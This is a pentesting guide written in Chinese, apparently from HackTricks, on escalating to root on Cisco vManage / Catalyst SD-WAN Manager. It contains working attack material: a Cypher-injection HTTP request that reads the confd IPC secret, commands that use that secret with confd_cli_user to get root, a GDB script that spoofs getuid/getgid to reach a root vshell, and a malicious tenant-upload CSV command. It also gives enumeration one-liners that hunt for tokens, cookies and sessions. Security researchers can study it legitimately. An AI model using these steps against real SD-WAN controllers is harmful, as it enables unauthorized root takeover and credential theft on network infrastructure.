# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

在 Cisco vManage / *Catalyst SD-WAN Manager* 上以 `vmanage`、`netadmin` 或 `vmanage-admin` 身份获得 code execution 后，最值得关注的本地 privesc 面通常是 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs 以及由 root 拥有的 import/upload handlers。

如果仍需要在 controller 上获取 **initial foothold**，请先查看专门的 control-plane 页面：

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 快速本地排查
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
如果从你的 `foothold` 中可以读取 `/etc/confd/confd_ipc_secret`，那么 Path 1 和 Path 2 会立即变得可行。如果你是通过远程 info leak 或 webshell 进入的，还应检查是否已经能够访问 `vmanage-admin` 的 SSH material 或 multitenancy upload handlers：2026 年的研究表明，这两者都是现实可行的 stepping stones。

## Path 1

(示例来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

在查阅了一些与 `confd` 和不同 binary 相关的[文档](http://66.218.245.39/doc/html/rn03re18.html)后（使用 Cisco 网站上的账户即可访问），我们发现，为了对 IPC socket 进行 authentication，它使用了位于 `/etc/confd/confd_ipc_secret` 中的 secret：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
还记得我们的 Neo4j instance 吗？它以 `vmanage` 用户的权限运行，因此我们可以利用之前的 vulnerability 获取该文件：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 程序不支持命令行参数，但会调用带参数的 `/usr/bin/confd_cli_user`。因此，我们可以直接使用自定义的参数集调用 `/usr/bin/confd_cli_user`。不过，以我们当前的权限无法读取它，所以必须从 rootfs 中获取该文件，并通过 scp 将其复制出来，读取帮助信息，然后利用它获取 shell：
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 路径 2

（示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)）

synacktiv 团队的博客¹介绍了一种获取 root shell 的优雅方法，但其限制在于，需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 才能读取。我找到了另一种无需这些麻烦即可提升至 root 权限的方法。

在对 `/usr/bin/confd_cli` binary 进行反汇编时，我观察到如下内容：

<details>
<summary>显示 UID/GID 收集过程的 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

当我运行“ps aux”时，我观察到以下内容（_注意 -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
我推测，“confd_cli”程序会将其从已登录用户处收集到的用户 ID 和组 ID 传递给“cmdptywrapper”应用程序。

我的第一次尝试是直接运行“cmdptywrapper”，并为其提供 `-g 0 -u 0`，但失败了。看起来某个文件描述符（-i 1015）在过程中被创建，我无法伪造它。

正如 synacktiv 的 blog（最后一个示例）中所提到的，`confd_cli`程序不支持命令行参数，但我可以通过 debugger 影响它，幸运的是系统中包含 GDB。

我创建了一个 GDB script，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 获得了“vmanage” privilege，因此有权限直接读取 `/etc/confd/confd_ipc_secret`。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
控制台输出：

<details>
<summary>控制台输出</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3（2025 CLI 输入验证漏洞 - CVE-2025-20122）

Cisco 后来在其针对 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) 的官方 advisory 中记录了一条更简洁的本地 root 路径：一个**仅拥有 read-only 权限的 authenticated attacker**，可以向 manager CLI 发送 crafted request，并因输入验证不足而跳转到 root。

从 offensive 的角度来看，重要结论如下：

1. 一旦你在设备上获得*任何* low-priv foothold，就应先测试本地 CLI service，而不是直接进行更复杂的 Path 1 / Path 2 流程。
2. 重用 Path 2 中的 artifacts 来查找 trust boundary：`confd_cli` → `cmdptywrapper` → `vshell`。
3. 将所有转发给 CLI backend 的字段视为可疑内容：UID/GID、username、terminal metadata、imported files，或任何之后会被 root-owned helper 使用的值。
4. 如果 low-priv user 能够访问本地 CLI socket 并影响这些字段，那么距离 root 可能只差一个 crafted request。

在 appliance 上成功落地后，一个实际的 workflow 是：
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
这会将 2025 年的 bug 转化为适用于类似版本的有效 hunting pattern：寻找**在 userland 中收集身份信息，并将其转发给权限更高的 wrapper 的本地 CLI shim**。

不要将 **CVE-2025-20122** 与后来的 **CVE-2026-20122** 混淆：2025 年的问题是一个*本地* CLI-to-root bug，而 2026 年的问题是一个*远程* API 任意文件覆盖漏洞，主要用于植入 foothold，然后回到 Path 1 / Path 2 / Path 4。

## Path 4（2026 低权限 REST API 到 root - CVE-2026-20126）

Cisco 2026 年 2 月的 advisory 还介绍了另一类有用的 privesc： [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) 由于 REST API 中存在不足的用户身份验证机制，使**拥有身份验证权限的本地低权限 attacker**能够获得 root 权限。

这很重要，因为 vManage privesc 不再局限于 `confd`/TTY abuse。获得低权限 shell 后，还应继续寻找：

- 过度信任调用方的仅限 localhost 访问的 API endpoint
- 当前账户可读取的 tokens、cookies 或 service credentials
- 通过 `dataservice`/REST handler 暴露、且仍可在本地触发的仅限 root 执行的操作

在实践中，一旦获得 `vmanage` 或其他 service user 的 shell，本地 API abuse 通常比交互式 CLI abuse 更隐蔽，也更容易自动化：
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
如果本地会话上下文足以访问特权 REST 功能，优先选择 API 路径：它更容易重放、编写脚本，并与窃取的 web 会话或 API tokens 组合使用。

## Path 5（由 root 处理的 2026 crafted file - CVE-2026-20245）

另一个近期模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)：具有 `netadmin` 权限的本地攻击者可以上传一个 **crafted file**，之后 CLI 会以不安全的方式处理该文件，最终以 `root` 身份实现 command injection。

从 HackTricks 的角度来看，其有价值的技术范围比具体 CVE 更广：

1. 枚举所有接受文件的 CLI 或 web 工作流：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
2. 跟踪上传文件的落点，以及哪个由 root 拥有的脚本或 binary 会使用该文件。
3. 测试 filename、file content 或 parsed metadata 是否曾被传递给 shell commands、wrapper scripts 或 `system()`-style helpers。
4. 如果你已经能够获得 `netadmin` 权限（有效凭据、窃取的 session 或 auth-bypass chain），file-processing bugs 通常是实现 root 权限的最快路径。

Google Cloud / Mandiant 随后展示了一个非常具体的此类 bug 被利用的实例，攻击通过 multitenancy import path 进行：
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
在观察到的攻击中，构造的 CSV 最终修改了 `/etc/passwd` 和 `/etc/shadow`，创建了一个临时 UID 0 账户（`troot`）。这使得 `tenant-upload` / `tenant-list` 风格的导入器尤其值得关注：它们不仅是数据摄取功能，还可能是由 root 所有的 parser 前端。

一种快速的 shell 侧 hunting 模式是：
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
此类 bug 与授予 `netadmin` 但不授予 `root` 权限的 remote foothold 尤其适合串联利用。

## 近期其他可串联利用的 vManage/Catalyst SD-WAN Manager 漏洞

- **未授权 info leak（CVE-2026-20133）** – 价值尤其高，因为公开研究表明它可以暴露 `confd_ipc_secret` 或 `vmanage-admin` private key，从而将 read bug 转化为 Path 1 或 NETCONF pivot。
- **Authenticated API arbitrary file overwrite（CVE-2026-20122）** – 与上文的 2025 CLI bug 不同；VulnCheck 曾利用它上传 webshell，这会使本页面中的 local privesc 路径立即变得相关。
- **Authenticated UI XSS（CVE-2024-20475）** – 窃取 web UI 中的 admin session，然后 pivot 到 API/CLI actions，最终触达 `vshell` 或上述某条 local privesc 路径。
- **Remote auth bypass to `netadmin`（CVE-2026-20129）** – 这是 Path 5 的极强前置条件，因为 `netadmin` 正好是 2026 crafted-file privesc 所要求的权限级别。
- **Authenticated arbitrary file write（CVE-2026-20262）** – 与 CVE-2026-20122 具有相似的 offensive value，但通过后续 web UI upload path 实现：将文件写入之后会被 root 或 management-plane web tier 解析的位置。
- **Downgrade to resurrect old CLI privesc（CVE-2022-20775）** – 2026 年的 intrusions 表明，攻击者可以回滚到较旧的 vulnerable SD-WAN build，利用旧版 CLI root bug，然后恢复原始版本。
- **Pre-auth control-plane auth bypass（CVE-2026-20182）** – dedicated SD-WAN control-plane 页面中有更详细的说明；它可以为 `vmanage-admin` 追加 SSH key，从而提供 local foothold，使你能够重新利用本页面中的内容。



## References

- [Cisco Catalyst SD-WAN Vulnerabilities（CVE-2026-20126、CVE-2026-20129 等）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller、Catalyst SD-WAN Manager 和 Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability（CVE-2026-20245）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck：Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant：Zero-Day Exploitation of Vulnerability（CVE-2026-20245）in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
